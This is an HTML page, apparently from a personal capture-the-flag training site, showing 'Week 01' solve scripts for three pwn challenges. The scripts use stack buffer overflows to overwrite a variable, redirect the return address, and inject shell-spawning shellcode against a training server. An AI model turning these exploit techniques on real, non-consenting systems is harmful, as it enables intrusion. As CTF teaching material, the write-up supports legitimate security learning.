@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>anomie0xff</title>
+    <link rel="stylesheet" href="https://anomie0xff.github.io/style.css">
+</head>
+
+<body>
+    <div class="header">
+        <h3><ul>
+            <li><a href="/">/anomie0xff</a></li>
+            <li><a href="/writeups">/writeups</a></li>
+            <li><a href="/pwn_bootcamp">/pwn_bootcamp</a></li>
+            <li><a href="/pwn_college">/pwn.college</a></li>
+        </ul></h3>
+    </div>
+    <section class="section">
+        <div class="container">
+            
+<h1 class="title">
+  Week 01
+</h1>
+
+<div class="page-content">
+<h1 id="flag-hole">Flag Hole</h1>
+<p>Buffer overflow to overwrite a variable</p>
+<p>Solve script:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>port= </span><span style="color:#d08770;">7003
+</span><span>p = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">pwn.cybr.club</span><span>&quot;, port)
+</span><span style="color:#65737e;">#p = process(&#39;./flag_hole&#39;)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">recv</span><span>()
+</span><span>p.</span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#96b5b4;">\x00</span><span>&#39;*</span><span style="color:#d08770;">100</span><span>)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span style="color:#65737e;"># looking at the assembly, the fd for /dev/null is stored at rbp-0xc, gets input is stored at rbp-0x70
+</span><span style="color:#65737e;"># 0x70 - 0x0c = 100, overwrite it with 0 which is the fd for stdout
+</span></code></pre>
+<h1 id="login">Login</h1>
+<p>Buffer overflow to overwrite return instruction pointer</p>
+<p>Solve script:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>port= </span><span style="color:#d08770;">7000
+</span><span>p = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">pwn.cybr.club</span><span>&quot;, port)
+</span><span>
+</span><span>win = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x4011a2</span><span>)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*</span><span style="color:#d08770;">40 </span><span>+ win)
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">lmao</span><span>&#39;)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">interactive</span><span>()
+</span></code></pre>
+<h1 id="sally">Sally</h1>
+<p>Given a leaked stack address, write shellcode and jump to it</p>
+<p>Solve script:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>port= </span><span style="color:#d08770;">7007
+</span><span>p = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">pwn.cybr.club</span><span>&quot;, port)
+</span><span style="color:#65737e;">#p = process(&#39;./sally&#39;)
+</span><span>elf = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">./sally</span><span>&#39;)
+</span><span>context.arch = elf.arch
+</span><span>
+</span><span>shellcode = </span><span style="color:#bf616a;">asm</span><span>(shellcraft.</span><span style="color:#bf616a;">sh</span><span>())
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">There are </span><span>&#39;)
+</span><span>leak = </span><span style="color:#bf616a;">int</span><span>(p.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;"> sea</span><span>&#39;).</span><span style="color:#bf616a;">split</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39; &#39;)[</span><span style="color:#d08770;">0</span><span>].</span><span style="color:#bf616a;">decode</span><span>(), </span><span style="color:#d08770;">16</span><span>)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(shellcode+ </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*(</span><span style="color:#d08770;">136</span><span>-</span><span style="color:#96b5b4;">len</span><span>(shellcode)) + </span><span style="color:#bf616a;">p64</span><span>(leak))
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">interactive</span><span>()
+</span></code></pre>
+
+</div>
+
+        </div>
+    </section>
+</body>
+
+</html>
